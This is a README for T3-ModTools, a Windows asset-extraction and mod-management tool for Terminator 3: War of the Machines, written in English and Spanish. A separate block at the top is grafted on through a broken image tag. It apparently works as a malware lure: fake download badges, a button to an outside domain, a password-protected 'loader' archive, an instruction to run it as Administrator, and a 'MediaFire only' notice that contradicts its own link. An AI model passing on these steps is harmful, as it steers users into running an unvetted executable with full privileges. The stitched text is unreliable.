<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

<p align="center">
  <img
# T3-ModTools

**Version 0.6.1**  
Experimental asset extraction, conversion, and mod management tool for **Terminator 3: War of the Machines (PC)**.
<br>
$\color{yellow}\textsf{Note: Mods that modify the Modded Launcher will cause the game to crash the first time the modifying mod is compiled.}$
$\color{yellow}\textsf{After the initial crash, a new game instance opens automatically, and the game starts without issues.}$
$\color{yellow}\textsf{This will not happen again unless a new mod that modifies the launcher is installed.}$
<br>
## What is T3-ModTools?

T3-ModTools is a Windows application designed to make the game's files easier to inspect and to provide a safer, organized way to install and combine mods.

The application has two main modes:

- **Asset Extraction** reads the game's ZIP-compatible COD archives and extracts selected content such as characters, vehicles, weapons, maps, menu models, effects, audio, and animations. It can also create working conversions of supported models, including OBJ/MTL files for static geometry and glTF 2.0 files for compatible rigged models.
- **Modding** manages independent mod projects, their enabled state, and their load order. It combines the files from enabled projects into `mods/Mods.Cod` and creates a separate `T3_Modded.exe` that loads the compiled package before the original game archives.

The original `T3.exe` is not modified. Each build recreates `T3_Modded.exe` from the original executable, allowing the unmodified game to remain available.

## Main capabilities

- Reads `Game.cod`, patch COD archives, installed game folders, and compatible backup archives.
- Extracts raw game assets by category.
- Converts supported SCA, LOD, and DET geometry to OBJ and MTL.
- Exports compatible rigged character, weapon, and vehicle models to glTF 2.0.
- Extracts native ANM animation files and produces animation metadata.
- Includes experimental Blender import and export plug-ins for supported T3 model and animation workflows.
- Creates and manages separate mod projects.
- Enables, disables, and reorders mods through a load-order system.
- Resolves duplicate asset paths according to load order when building the combined package.
- Compiles enabled project files into `mods/Mods.Cod`.
- Builds `T3_Modded.exe` without overwriting the original executable.
- Supports optional, conservative executable patch manifests and stops the build when incompatible patch writes conflict.

## Purpose and scope

T3-ModTools is intended for personal modding, preservation, and interoperability research using a legally owned copy of the game. It does not bypass DRM, encryption, online authentication, or anti-cheat systems.

This project is experimental. Some assets or workflows may require target-specific testing, and adding entirely new game content can require configuration or engine research beyond ordinary file replacement.

# Español

**Versión 0.6.1**  
Herramienta experimental de extracción, conversión y gestión de mods para **Terminator 3: War of the Machines (PC)**.
<br>
$\color{yellow}\textsf{Tener en cuenta: Los mods que modifican el Modded Launcher hacen que el juego tenga un crash la primera vez}$
$\color{yellow}\textsf{que se compila el mod que lo modifica. Luego del primer crash se abre una instancia del juego nueva automaticamente e inicia el juego}$
$\color{yellow}\textsf{sin problema. No volvera a suceder a menos que un nuevo mod que modifica el launcher sea instalado.}$
<br>

## ¿Qué es T3-ModTools?

T3-ModTools es una aplicación para Windows diseñada para facilitar la inspección de los archivos del juego y proporcionar una forma más segura y organizada de instalar y combinar mods.

La aplicación posee dos modos principales:

- **Extracción de assets** lee directamente los archivos COD del juego, compatibles con ZIP, y extrae el contenido seleccionado, como personajes, vehículos, armas, mapas, modelos de menú, efectos, audio y animaciones. También puede crear conversiones de trabajo de modelos compatibles, incluidos archivos OBJ/MTL para geometría estática y archivos glTF 2.0 para modelos riggeados compatibles.
- **Modding** administra proyectos de mods independientes, su estado de activación y su orden de carga. Combina los archivos de los proyectos activados en `mods/Mods.Cod` y crea un `T3_Modded.exe` separado que carga el paquete compilado antes que los archivos originales del juego.

El archivo `T3.exe` original no es modificado. Cada compilación vuelve a crear `T3_Modded.exe` a partir del ejecutable original, por lo que el juego sin modificaciones continúa disponible.

## Funciones principales

- Lee `Game.cod`, archivos COD de parches, carpetas de instalación del juego y copias de seguridad compatibles.
- Extrae assets originales del juego por categorías.
- Convierte geometría SCA, LOD y DET compatible a OBJ y MTL.
- Exporta modelos riggeados compatibles de personajes, armas y vehículos a glTF 2.0.
- Extrae animaciones ANM originales y genera información sobre ellas.
- Incluye complementos experimentales de Blender para procesos compatibles de importación y exportación de modelos y animaciones de T3.
- Crea y administra proyectos de mods separados.
- Permite activar, desactivar y ordenar mods mediante un sistema de orden de carga.
- Resuelve rutas de assets duplicadas según el orden de carga al crear el paquete combinado.
- Compila los archivos de los proyectos activados en `mods/Mods.Cod`.
- Genera `T3_Modded.exe` sin sobrescribir el ejecutable original.
- Admite manifiestos opcionales y conservadores de parches del ejecutable, y detiene la compilación cuando dos modificaciones incompatibles intentan escribir sobre la misma zona.

## Propósito y alcance

T3-ModTools está destinado al modding personal, la preservación y la investigación de interoperabilidad con una copia legal del juego. No evade DRM, cifrado, autenticación en línea ni sistemas antitrampas.

Este proyecto es experimental. Algunos assets o procesos pueden necesitar pruebas específicas, y agregar contenido completamente nuevo puede requerir configuración o investigación del motor más allá del reemplazo normal de archivos.
